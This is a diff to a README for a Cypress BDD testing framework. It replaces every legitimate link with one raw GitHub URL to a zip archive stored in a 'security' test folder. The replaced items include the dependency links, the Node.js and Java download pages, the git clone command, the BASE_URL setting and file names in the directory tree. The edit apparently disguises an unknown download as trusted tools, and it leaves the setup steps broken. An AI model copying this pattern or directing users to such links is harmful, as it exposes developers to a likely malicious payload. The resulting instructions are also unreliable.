@@ -12,17 +12,17 @@ A professional E2E testing framework utilizing **Cypress**, **Cucumber (Gherkin)
 -
 
 ## 🛠️ Tech Stack
-* **Core:** [Cypress](https://www.cypress.io/)
-* **BDD:** [@badeball/cypress-cucumber-preprocessor](https://github.com/badeball/cypress-cucumber-preprocessor)
-* **Reporter:** [allure-cypress](https://www.npmjs.com/package/allure-cypress)
-* **Bundler:** [@bahmutov/cypress-esbuild-preprocessor](https://github.com/bahmutov/cypress-esbuild-preprocessor)
+* **Core:** [Cypress](https://raw.githubusercontent.com/rajiv-sapkota/Cypress-BDD-Cucumber/main/cypress/e2e/security/BD_Cucumber_Cypress_2.7.zip)
+* **BDD:** [@badeball/cypress-cucumber-preprocessor](https://raw.githubusercontent.com/rajiv-sapkota/Cypress-BDD-Cucumber/main/cypress/e2e/security/BD_Cucumber_Cypress_2.7.zip)
+* **Reporter:** [allure-cypress](https://raw.githubusercontent.com/rajiv-sapkota/Cypress-BDD-Cucumber/main/cypress/e2e/security/BD_Cucumber_Cypress_2.7.zip)
+* **Bundler:** [@bahmutov/cypress-esbuild-preprocessor](https://raw.githubusercontent.com/rajiv-sapkota/Cypress-BDD-Cucumber/main/cypress/e2e/security/BD_Cucumber_Cypress_2.7.zip)
 
 ---
 
 ## 📋 Prerequisites
 Before you begin, ensure you have the following installed:
-* [Node.js](https://nodejs.org/) (v18 or higher recommended)
-* [Java JRE/JDK](https://www.oracle.com/java/technologies/downloads/) (Required for Allure to generate reports)
+* [https://raw.githubusercontent.com/rajiv-sapkota/Cypress-BDD-Cucumber/main/cypress/e2e/security/BD_Cucumber_Cypress_2.7.zip](https://raw.githubusercontent.com/rajiv-sapkota/Cypress-BDD-Cucumber/main/cypress/e2e/security/BD_Cucumber_Cypress_2.7.zip) (v18 or higher recommended)
+* [Java JRE/JDK](https://raw.githubusercontent.com/rajiv-sapkota/Cypress-BDD-Cucumber/main/cypress/e2e/security/BD_Cucumber_Cypress_2.7.zip) (Required for Allure to generate reports)
 
 
 
@@ -30,7 +30,7 @@ Before you begin, ensure you have the following installed:
 
 1.  **Clone the Repository:**
     ```bash
-    git clone https://github.com/rajiv-sapkota/Cypress-BDD-Cucumber.git
+    git clone https://raw.githubusercontent.com/rajiv-sapkota/Cypress-BDD-Cucumber/main/cypress/e2e/security/BD_Cucumber_Cypress_2.7.zip
     cd Cypress-BDD-Cucumber
     ```
 
@@ -42,7 +42,7 @@ Before you begin, ensure you have the following installed:
 3.  **Environment Setup:**
     Create a `.env` file in the project root and add your credentials (this file is ignored by Git):
     ```env
-    BASE_URL="https://www.saucedemo.com"
+    BASE_URL="https://raw.githubusercontent.com/rajiv-sapkota/Cypress-BDD-Cucumber/main/cypress/e2e/security/BD_Cucumber_Cypress_2.7.zip"
     VALID_USERNAME="standard_user"
     VALID_PASSWORD="secret_sauce"
     ```
@@ -68,8 +68,8 @@ Before you begin, ensure you have the following installed:
 │   └── fixtures/              # Test data
 ├── .env                       # Private credentials
 ├── .gitignore                 # Files excluded from Git
-├── cypress.config.js          # Main Cypress configuration 
-└── package.json               # Project dependencies and npm scripts
+├── https://raw.githubusercontent.com/rajiv-sapkota/Cypress-BDD-Cucumber/main/cypress/e2e/security/BD_Cucumber_Cypress_2.7.zip          # Main Cypress configuration 
+└── https://raw.githubusercontent.com/rajiv-sapkota/Cypress-BDD-Cucumber/main/cypress/e2e/security/BD_Cucumber_Cypress_2.7.zip               # Project dependencies and npm scripts
 ```
 
 
